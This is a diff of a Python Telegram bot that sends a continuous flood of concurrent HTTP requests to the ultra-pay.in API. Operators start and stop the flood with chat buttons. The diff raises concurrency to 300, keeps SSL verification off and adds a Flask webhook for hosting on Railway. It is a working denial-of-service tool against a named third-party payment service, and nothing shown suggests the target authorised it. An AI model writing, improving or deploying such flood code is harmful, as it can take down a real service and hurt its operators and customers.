@@ -1,13 +1,14 @@
+# bot.py
 #!/usr/bin/env python3
 """
-Telegram Bot for ultra-pay.in API Flood Testing
-Host on Railway - Using Polling (No webhooks)
+Telegram Bot with Webhook - No Conflict
 """
 import asyncio
 import aiohttp
 from itertools import cycle
 from datetime import datetime
 import os
+from flask import Flask, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 import logging
@@ -38,6 +39,9 @@ status_counts = {}
 start_time = None
 
 logging.basicConfig(level=logging.INFO)
+
+# Flask app for webhook
+app = Flask(__name__)
 
 async def fetch_one(session, url, semaphore):
     global total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts
@@ -74,7 +78,7 @@ async def fetch_one(session, url, semaphore):
 async def flood_loop():
     global flood_active
     
-    CONCURRENT = 200
+    CONCURRENT = 300
     connector = aiohttp.TCPConnector(ssl=False, limit=0)
     semaphore = asyncio.Semaphore(CONCURRENT)
     url_cycle = cycle(URLS)
@@ -89,6 +93,7 @@ async def flood_loop():
             await asyncio.gather(*tasks, return_exceptions=True)
             await asyncio.sleep(0.1)
 
+# Bot handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [
@@ -102,8 +107,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         "🤖 *Ultra-Pay Flood Bot*\n\n"
-        "This bot sends high-concurrency requests to ultra-pay.in API\n"
-        "Use buttons below to control the flood:\n\n"
+        "Bot sends high-concurrency requests to ultra-pay.in API\n"
+        "Use buttons below:\n\n"
         f"📌 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
         f"📊 Total: {total_requests}\n"
         f"✅ Success: {successful_requests}",
@@ -121,11 +126,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not flood_active:
             flood_active = True
             start_time = datetime.now()
-            # Start flood in background
             asyncio.create_task(flood_loop())
             await query.edit_message_text(
                 "🟢 *Flood Started!*\n\n"
-                "Sending 300 concurrent requests continuously...\n"
+                "Sending 300 concurrent requests...\n"
                 "Use 'Get Stats' to see progress.",
                 parse_mode='Markdown'
             )
@@ -190,31 +194,58 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📖 *Commands:*\n\n"
         "/start - Show main menu\n"
         "/stats - Show current statistics\n"
-        "/help - Show this help\n\n"
-        "*Bot Features:*\n"
-        "• Send 300 concurrent requests\n"
-        "• Track all responses\n"
-        "• Count timeouts\n"
-        "• Real-time statistics\n"
-        "• Admin control only",
+        "/help - Show this help",
         parse_mode='Markdown'
     )
 
-def main():
-    # Build application
-    app = Application.builder().token(BOT_TOKEN).build()
+# Flask route for webhook
+@app.route(f'/{BOT_TOKEN}', methods=['POST'])
+async def webhook():
+    try:
+        update = Update.de_json(request.get_json(force=True), bot_app.bot)
+        await bot_app.process_update(update)
+        return 'ok', 200
+    except Exception as e:
+        print(f"Webhook error: {e}")
+        return 'error', 500
+
+@app.route('/', methods=['GET'])
+def home():
+    return "Bot is running!"
+
+def setup_bot():
+    """Setup bot application"""
+    global bot_app
+    bot_app = Application.builder().token(BOT_TOKEN).build()
     
-    # Add handlers
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CallbackQueryHandler(button_handler))
+    bot_app.add_handler(CommandHandler("start", start))
+    bot_app.add_handler(CommandHandler("help", help_command))
+    bot_app.add_handler(CallbackQueryHandler(button_handler))
     
-    # Start polling (no webhook needed)
-    print("🤖 Bot is starting with polling mode...")
-    print(f"📊 Admin ID: {ADMIN_ID}")
-    print("✅ Bot is ready!")
-    
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    return bot_app
 
 if __name__ == "__main__":
-    main()
+    # Setup bot
+    bot_app = setup_bot()
+    
+    # Set webhook
+    port = int(os.environ.get("PORT", 8080))
+    
+    # Clear any existing webhook
+    import requests
+    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
+    
+    # Set webhook
+    webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}/{BOT_TOKEN}" if os.environ.get('RAILWAY_STATIC_URL') else f"http://localhost:{port}/{BOT_TOKEN}"
+    
+    if os.environ.get('RAILWAY_STATIC_URL'):
+        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
+        print(f"✅ Webhook set: {webhook_url}")
+    else:
+        # Local development - use polling
+        print("⚠️ Local mode - using polling")
+        bot_app.run_polling()
+    
+    # Run Flask
+    print(f"🚀 Starting bot on port {port}")
+    app.run(host='0.0.0.0', port=port)
